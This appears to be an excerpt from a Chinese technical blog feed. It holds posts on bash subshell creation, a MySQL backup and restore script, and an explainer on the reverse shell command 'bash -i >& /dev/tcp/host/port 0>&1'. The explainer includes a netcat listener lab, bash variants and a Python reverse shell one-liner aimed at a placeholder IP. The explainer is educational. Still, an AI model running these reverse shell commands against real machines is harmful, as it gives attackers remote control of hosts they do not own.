<p>​     删减部分内容。</p>
<ul>
<li><p><code>pstree</code>  以树状结构显示进程间关系的工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├─sshd,1023 -D</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   ├─sshd,35522</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │   └─bash,35524</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │       └─pstree,35589 -ap</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   └─sshd,47866</span></pre></td></tr><tr><td class="code"><pre><span class="line">│       └─bash,47868</span></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h2 id="命令执行的几种方式"><a href="#命令执行的几种方式" class="headerlink" title="命令执行的几种方式"></a>命令执行的几种方式</h2><h3 id="1-shell-中直接执行"><a href="#1-shell-中直接执行" class="headerlink" title="1. shell 中直接执行"></a>1. shell 中直接执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master ~]# sleep 100</span></pre></td></tr></table></figure>
<h3 id="2-以文件的形式执行"><a href="#2-以文件的形式执行" class="headerlink" title="2. 以文件的形式执行"></a>2. 以文件的形式执行</h3><p>以文件执行有两种方式</p>
<h4 id="test-sh-方式执行"><a href="#test-sh-方式执行" class="headerlink" title="./test.sh 方式执行"></a><code>./test.sh</code> 方式执行</h4><p>举个例子 shell 脚本为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span></pre></td></tr><tr><td class="code"><pre><span class="line">sleep 100</span></pre></td></tr></table></figure>
<p>执行方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master ~]# .&#x2F;test.sh</span></pre></td></tr></table></figure>
<p>进程关系（bash 在执行外部命令会单独分配子进程）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">│   ├─sshd,35522</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │   └─bash,35524</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │       └─test.sh,42281 .&#x2F;test.sh</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │           └─sleep,42282 100</span></pre></td></tr></table></figure>
<p>可以看到 bash 为 test.sh 分配一个子进程用于执行这个脚本。</p>
<p>总结：  <strong><code>./test.sh</code>这种方式由shell分配一个子进程来执行此脚本</strong></p>
<h4 id="source-test-sh-执行"><a href="#source-test-sh-执行" class="headerlink" title="source  test.sh  执行"></a>source  test.sh  执行</h4><p>使用 <code>source</code> 命令并不会为单独创建进程用于执行这个脚本。而是在当前 shell 下执行。因此脚本中的环境变量等值会被带到当前 shell 环境中这也是我们在修改<code>/etc/profile</code>之后 <code>source /etc/profile</code> 一下</p>
<p> <code>. test.sh</code> 和 <code>source test.sh</code> 执行方式一样直接在当前 shell 下执行可以参考下面的 <code>man source</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.  filename [arguments]</span></pre></td></tr><tr><td class="code"><pre><span class="line">source filename [arguments]</span></pre></td></tr><tr><td class="code"><pre><span class="line">          Read and execute commands from filename  in  the  current  shell</span></pre></td></tr><tr><td class="code"><pre><span class="line">          environment  and return the exit status of the last command exe‐</span></pre></td></tr></table></figure>
<p>还是举出上个例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span></pre></td></tr><tr><td class="code"><pre><span class="line">sleep 100</span></pre></td></tr></table></figure>
<p>执行方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master ~]# . test.sh</span></pre></td></tr></table></figure>
<p>进程间的关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">├─sshd,1023 -D</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   ├─sshd,35522</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │   └─bash,35524</span></pre></td></tr><tr><td class="code"><pre><span class="line">│   │       └─sleep,42402 100</span></pre></td></tr></table></figure>
<p>总结： <strong>在使用 <code>source test.sh</code> 或者 <code>. test.sh</code> 方式执行脚本的时候 bash 并不会单独为此脚本分配一个子进程</strong></p>
<h2 id="那些情况下会创建子进程"><a href="#那些情况下会创建子进程" class="headerlink" title="那些情况下会创建子进程"></a>那些情况下会创建子进程</h2><h3 id="1-执行外部脚本，和程序"><a href="#1-执行外部脚本，和程序" class="headerlink" title="1. 执行外部脚本，和程序"></a>1. 执行外部脚本，和程序</h3><p>参见上述例子</p>
<h3 id="2-使用-命令替换的时候"><a href="#2-使用-命令替换的时候" class="headerlink" title="2. 使用 $()  命令替换的时候"></a>2. 使用 <code>$()</code>  <code></code>命令替换的时候</h3><p>Linux 使用反引号”`”或者$()来执行命令替换。使用括号来组合一系列命令。</p>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@master test]# echo what date? &#96;date +%F&#96;</span></pre></td></tr><tr><td class="code"><pre><span class="line">what date? 2018-12-30</span></pre></td></tr></table></figure>
<p>使用$()可以让括号里的命令提前于整个命令运行，然后将执行结果插入在命令替换符号处。由于命令替换的结果经常交给外部命令，不应该让结果有换行的行为，所以默认将所有的换行符替换为了空格(实际上所有的空白符都被压缩成了单个空格)。</p>
<p>Bash 手册 <a href="https://www.gnu.org/software/bash/manual/bash.html#Command-Substitution" target="_blank" rel="noopener">命令替换</a>中有详细介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Bash performs the expansion by executing command in a subshell environment and replacing the command substitution with the standard output of the command, with any trailing newlines deleted. Embedded newlines are not deleted, but they may be removed during word splitting. The command substitution $(cat file) can be replaced by the equivalent but faster</span></pre></td></tr></table></figure>
<p><strong>命令替换分为两个过程：(1)开启子shell执行其中的命令(2)将子shell中的输出结果打包插入在命令行中。但打包输出结果的过程是可以控制的(例如上面使用双引号)。</strong></p>
<h3 id="3-amp-提交后台作业的时候"><a href="#3-amp-提交后台作业的时候" class="headerlink" title="3. &amp; 提交后台作业的时候"></a>3. &amp; 提交后台作业的时候</h3><p>&amp; 放在启动参数后面表示设置此进程为后台进程</p>
<h3 id="4-使用管道"><a href="#4-使用管道" class="headerlink" title="4. 使用管道"></a>4. 使用管道</h3><p>管道中的每个命令都作为单独的进程来执行(即，在一个子 shell 中启动)。</p>
<h3 id="6-使用-命令组合的时候"><a href="#6-使用-命令组合的时候" class="headerlink" title="6. 使用 () 命令组合的时候"></a>6. 使用 <code>()</code> 命令组合的时候</h3><p><a href="https://www.gnu.org/software/bash/manual/bash.html#Grouping-Commands" target="_blank" rel="noopener">命令组</a>()括号中的命令将会新开一个子shell顺序执行，所以括号中的变量不能够被脚本余下的部分使用。括号中多个命令之间用分号隔开，最后一个命令可以没有分号，各命令和括号之间不必有空格。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Placing a list of commands between parentheses causes a subshell environment to be created</span></pre></td></tr></table></figure>
<p><strong>命令使用<code>{}</code> 包围或者bash 内置的命令都不会单独创建子进程 </strong></p>
<p>(待修改-)</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>exec</tag>
        <tag>subshell</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1 的含义</title>
    <url>/2019/01/bash_i_dev_tcp/</url>
    <content><![CDATA[<h2 id="1-什么是-dev-tcp-dev-udp"><a href="#1-什么是-dev-tcp-dev-udp" class="headerlink" title="1. 什么是/dev/tcp/ /dev/udp"></a>1. 什么是<code>/dev/tcp/</code> <code>/dev/udp</code></h2><p>类似 <code>/dev/tcp/host/port</code>   <code>/dev/udp/host/port</code>  这种形式实际上属于bash的一个特性,类似一种固定的格式调用底层函数打开一个socket,在其他的 shell 中并不一定用(ksh 有这种写法)。这是一个特殊的文件实际上在 dev 目录下是不存在的。利用它我们可以创建 TCP/UDP 的连接。这里我们举一个例子</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec 9&lt;&gt;/dev/tcp/www.hactcm.edu.cn/80   # 打开一个文件描述符 9 并且绑定一个 socket</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -e  "GET / HTTP/1.1/n/n" &gt;&amp;9       # 像 9 中发送一个字符串</span></pre></td></tr><tr><td class="code"><pre><span class="line">cat &lt;&amp;9                                 # 取出 9 中收到的字符串</span></pre></td></tr></table></figure>
<p>结果是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 400 Bad Request</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Type: text&#x2F;html</span></pre></td></tr><tr><td class="code"><pre><span class="line">Content-Length: 7083</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">.........</span></pre></td></tr></table></figure>
<p>我们还可以从 <code>/dev/fd/</code>  中看到文件描述符9指向一个socket</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# ls -lah /dev/fd/</span></pre></td></tr><tr><td class="code"><pre><span class="line">总用量 0</span></pre></td></tr><tr><td class="code"><pre><span class="line">dr-x------ 2 root root  0 1月   3 21:10 .</span></pre></td></tr><tr><td class="code"><pre><span class="line">dr-xr-xr-x 9 root root  0 1月   3 21:10 ..</span></pre></td></tr><tr><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 0 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 1 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 2 -&gt; /dev/pts/0</span></pre></td></tr><tr><td class="code"><pre><span class="line">lr-x------ 1 root root 64 1月   3 21:10 3 -&gt; /proc/7597/fd</span></pre></td></tr><tr><td class="code"><pre><span class="line">lrwx------ 1 root root 64 1月   3 21:10 9 -&gt; socket:[34195773]</span></pre></td></tr><tr><td class="code"><pre><span class="line">[root@master ~]#</span></pre></td></tr></table></figure>
<p>最后别忘记释放链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec &gt;&amp;9-</span></pre></td></tr></table></figure>
<p>理解了 <code>/dev/tcp/host/port</code>  的含义我们看一看</p>
<h2 id="2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1"><a href="#2-理解bash-i-gt-amp-dev-tcp-localhost-8080-0-gt-amp-1" class="headerlink" title="2. 理解bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1"></a>2. 理解<code>bash -i &gt;&amp; /dev/tcp/localhost/8080 0&gt;&amp;1</code></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;localhost&#x2F;8080 0&gt;&amp;1</span></pre></td></tr></table></figure>
<p>这是一个常用的反弹 shell 的命令。常用于把内网的机器反弹到外网机器上从而实现 外网主机控制内网主机。</p>
<ul>
<li><p><code>bash -i</code> 打开一个交互式的shell</p>
</li>
<li><p><code>&gt;&amp;</code>  这个命令和 <code>&amp;&gt;</code> 是一样的而且我推荐大家使用 <code>&amp;&gt;</code> 。这两个符号的含义是把标准错误和标准输出重定向到文件。举个例子大家可以执行以下看一下结果</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -la &gt; aaa.log    # 标准输出重定向到文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">lss -la &gt; aaa.log   # 标准错误未重定向到文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">lss -la &amp;&gt; aaa.log  # 标准错误和标准输出未重定向到文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">cat aaa.log </span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">lss -la &gt;&amp; aaa.log  # 标准错误和标准输出未重定向到文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">cat aaa.log         # 查看结果</span></pre></td></tr></table></figure>
<p>对于这个<code>&gt;&amp;</code>  <code>&amp;&gt;</code> 的解释可以看<a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html#Redirecting-Standard-Output-and-Standard-Error" target="_blank" rel="noopener">bash的手册</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">This construct allows both the standard output (file descriptor 1) and the standard error output (file descriptor 2) to be redirected to the file whose name is the expansion of word.</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">There are two formats for redirecting standard output and standard error:</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&amp;&gt;word</span></pre></td></tr><tr><td class="code"><pre><span class="line">and</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;&amp;word</span></pre></td></tr><tr><td class="code"><pre><span class="line">Of the two forms, the first is preferred. This is semantically equivalent to</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;word 2&gt;&amp;1</span></pre></td></tr><tr><td class="code"><pre><span class="line">When using the second form, word may not expand to a number or ‘-’. If it does, other redirection operators apply (see Duplicating File Descriptors below) for compatibility reasons.</span></pre></td></tr></table></figure>
<p><strong>一句话说就是这两个符号代表的含义是一样的</strong></p>
</li>
<li><p><code>0&gt;&amp;1</code> 把输入重定向到标准输出</p>
</li>
</ul>
<p><strong>这样外网的机器就可以获得一个完整的 shell </strong>,有兴趣的大家可以试一下</p>
<h2 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h2><p>外网机器执行 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 8787</span></pre></td></tr></table></figure>
<p>内网机器执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 0&gt;&amp;1</span></pre></td></tr></table></figure>
<p>当然在 bash 下执行是没问题的但是在其他 shell 下执行会报错所以更健壮的写法是 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 0&gt;&amp;1&#39;</span></pre></td></tr></table></figure>
<p>实际上还可以这样写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;外网机器IP&#x2F;8787 &lt;&amp;1&#39;</span></pre></td></tr></table></figure>
<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p>网上传的很多语言的脚本也是利用这个原理,反弹一个shell让我们控制，看下利用的条件 </p>
<ul>
<li>支持 tcp 链接</li>
<li>支持 IO 重定向</li>
<li>可以调用系统命令</li>
</ul>
<p>只要满足这三个你熟知的语言都可以替换掉这行命令</p>
<p>下面贴一个Python的反弹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("XXX.XXX.XXX.XXX",8787));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span></pre></td></tr><tr><td class="code"><pre><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="code"><pre><span class="line">s.connect((<span class="string">"外网机器IP"</span>,<span class="number">8787</span>))</span></pre></td></tr><tr><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>])</span></pre></td></tr></table></figure>
<h2 id="5-致谢"><a href="#5-致谢" class="headerlink" title="5. 致谢"></a>5. 致谢</h2><p>谢谢小明同学和小陈同学给出的中肯意见。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 备份脚本</title>
    <url>/2019/01/mysqlbak/</url>
    <content><![CDATA[<h2 id="1-MySQL-备份脚本"><a href="#1-MySQL-备份脚本" class="headerlink" title="1. MySQL 备份脚本"></a>1. MySQL 备份脚本</h2><p>最初脚本为在某个 QQ 群里看到然后又改的。</p>
<p><a href="/downloads/mysqlbak.sh">点击下载</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> MySQL 数据库备份 可以指定备份保留次数，指定不备份数据库</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin</span></pre></td></tr><tr><td class="code"><pre><span class="line">export PATH</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">db_host="localhost"</span></pre></td></tr><tr><td class="code"><pre><span class="line">db_user="tmper"</span></pre></td></tr><tr><td class="code"><pre><span class="line">db_passwd="MT1IdhVds"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">保留备份数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">savebakcount=8</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">排除备份数据库</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">notbakdatabase=('performance_schema','information_schema','mysql','test','sys')</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 备份文件目录</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">backup_dir="/home/mysql_bak"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 备份文件时间格式(yyyy-mm-dd_HH_MM)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">time="$(date +"%Y-%m-%d_%H_%M")"</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 要备份的 MySQL 信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">MYSQL="/usr/bin/mysql"</span></pre></td></tr><tr><td class="code"><pre><span class="line">MYSQLDUMP="/usr/bin/mysqldump"</span></pre></td></tr><tr><td class="code"><pre><span class="line">MKDIR="mkdir"</span></pre></td></tr><tr><td class="code"><pre><span class="line">RM="rm"</span></pre></td></tr><tr><td class="code"><pre><span class="line">MV="mv"</span></pre></td></tr><tr><td class="code"><pre><span class="line">GZIP="gzip"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 检查目录是否可写</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">test ! -w $backup_dir &amp;&amp; echo "Error: $backup_dir is un-writeable." &amp;&amp; exit 0</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 测试是否创建了临时备份目录</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">test ! -d "$backup_dir/backup.0/" &amp;&amp; $MKDIR "$backup_dir/backup.0/"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 得到所有的数据库信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">all_db="$($MYSQL -u $db_user -h $db_host -p$db_passwd -Bse 'show databases')"</span></pre></td></tr><tr><td class="code"><pre><span class="line">for db in $all_db;do</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">数据库是否为排除备份数据库</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">echo "$&#123;notbakdatabase[@]&#125;" | grep -wq "$db" &amp;&amp;  continue</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo "正在备份$&#123;db&#125;..."</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">MYSQLDUMP   --single-transaction -u <span class="variable">$db_user</span> -h <span class="variable">$db_host</span> -p<span class="variable">$db_passwd</span> <span class="variable">$db</span> | <span class="variable">$GZIP</span> -9 &gt; <span class="string">"<span class="variable">$backup_dir</span>/backup.0/<span class="variable">$time</span>.<span class="variable">$db</span>.sql.gz"</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line">done</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> delete the oldest backup</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">test -d "$backup_dir/backup.$savebakcount/" &amp;&amp; $RM -rf "$backup_dir/backup.$savebakcount"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> rotate backup directory</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">for int in  `seq $savebakcount -1 0`</span></pre></td></tr><tr><td class="code"><pre><span class="line">do</span></pre></td></tr><tr><td class="code"><pre><span class="line">if(test -d "$backup_dir"/backup."$int");then</span></pre></td></tr><tr><td class="code"><pre><span class="line">next_int=`expr $int + 1`</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">MV <span class="string">"<span class="variable">$backup_dir</span>"</span>/backup.<span class="string">"<span class="variable">$int</span>"</span> <span class="string">"<span class="variable">$backup_dir</span>"</span>/backup.<span class="string">"<span class="variable">$next_int</span>"</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line">done</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">[[ -d "$backup_dir"/backup.1 ]] || echo "back error"</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">exit 0;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">备份数据库定时计划</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">23 23 * * * (flock -xn /tmp/mysqlbak.lock -c /opt/mysqlbak.sh &gt;&gt;/var/<span class="built_in">log</span>/mysql_bak.log 2&gt;&amp;1)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">grant select, RELOAD, SHOW DATABASES, LOCK TABLES on *.* to <span class="string">'tmper'</span>@localhost identified by <span class="string">'MT1IdhVds'</span></span></span></pre></td></tr></table></figure>
<p>首先登陆 MySQL 进行授权账号密码。备份路径可以自己指定默认是<code>/home/mysql_bak</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant select, RELOAD, SHOW DATABASES, LOCK TABLES on *.* to &#39;tmper&#39;@localhost identified by &#39;MT1IdhVds&#39;</span></pre></td></tr></table></figure>
<p>把</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23 23 * * * (flock -xn &#x2F;tmp&#x2F;mysqlbak.lock -c &#x2F;opt&#x2F;mysqlbak.sh &gt;&gt;&#x2F;var&#x2F;log&#x2F;mysql_bak.log 2&gt;&amp;1)</span></pre></td></tr></table></figure>
<p>加入 crontab 中重启 crond ， CentOS下的命令是 <code>systemctl restart crond</code> 。</p>
<h2 id="2-恢复脚本"><a href="#2-恢复脚本" class="headerlink" title="2. 恢复脚本"></a>2. 恢复脚本</h2><p><a href="/downloads/mysqlrecovery.sh">点击下载</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> MySQL 数据库恢复脚本可以指定恢复的次数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin</span></pre></td></tr><tr><td class="code"><pre><span class="line">export PATH</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">db_host="localhost"</span></pre></td></tr><tr><td class="code"><pre><span class="line">db_user="root"</span></pre></td></tr><tr><td class="code"><pre><span class="line">db_passwd="123#456"</span></pre></td></tr><tr><td class="code"><pre><span class="line">backup_dir="/home/mysql_bak"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> MySQL 信息</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">MYSQL="/usr/bin/mysql"</span></pre></td></tr><tr><td class="code"><pre><span class="line">MYSQLDUMP="/usr/bin/mysqldump"</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">GUNZIP="gunzip"</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 检查目录是否可写</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">BACK_PATH=$1</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">test ! -d "$BACK_PATH" &amp;&amp; echo "Error: please input back_path or $backup_PATH is not find." &amp;&amp; exit 0</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">cd "$BACK_PATH"</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">for db in `ls|grep sql.gz`;do</span></pre></td></tr><tr><td class="code"><pre><span class="line">	dbname=`echo $db|cut -d . -f 2`</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">	#</span><span class="bash">create databases</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	echo "Will import $dbname DATA from $BACK_PATH/$db...."</span></pre></td></tr><tr><td class="code"><pre><span class="line">done</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -n "will recover data Please enter yes or no  -&gt; "</span></pre></td></tr><tr><td class="code"><pre><span class="line">read judge</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">if [[ "$judge" != "yes" ]]; then</span></pre></td></tr><tr><td class="code"><pre><span class="line">	echo "not input yes exit!!!"</span></pre></td></tr><tr><td class="code"><pre><span class="line">	exit 0;</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">for db in `ls|grep sql.gz`;do</span></pre></td></tr><tr><td class="code"><pre><span class="line">	dbname=`echo $db|cut -d . -f 2`</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">	#</span><span class="bash">create databases</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	create_db="CREATE DATABASE IF NOT EXISTS $dbname DEFAULT CHARSET utf8 COLLATE utf8_general_ci;"</span></pre></td></tr><tr><td class="code"><pre><span class="line">	echo $create_db</span></pre></td></tr><tr><td class="code"><pre><span class="line">	echo "CREATE TABLE $dbname"</span></pre></td></tr><tr><td class="code"><pre><span class="line">	echo ''</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">	$</span><span class="bash">MYSQL -u <span class="variable">$db_user</span> -h <span class="variable">$db_host</span> -p<span class="variable">$db_passwd</span> -e <span class="string">"<span class="variable">$create_db</span>"</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	echo "IMPORT $db DATA from BACK...."</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">	$</span><span class="bash">GUNZIP -c <span class="variable">$db</span> |<span class="variable">$MYSQL</span> -u <span class="variable">$db_user</span> -h <span class="variable">$db_host</span> -p<span class="variable">$db_passwd</span> <span class="variable">$dbname</span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line">done</span></pre></td></tr><tr><td class="code"><pre><span class="line">exit 0;</span></pre></td></tr></table></figure>
<p>恢复方式为指定恢复路径的备份文件然后运行。注意会覆盖原有数据。</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Prometheus 安装</title>
    <url>/2019/01/prometheus_install/</url>
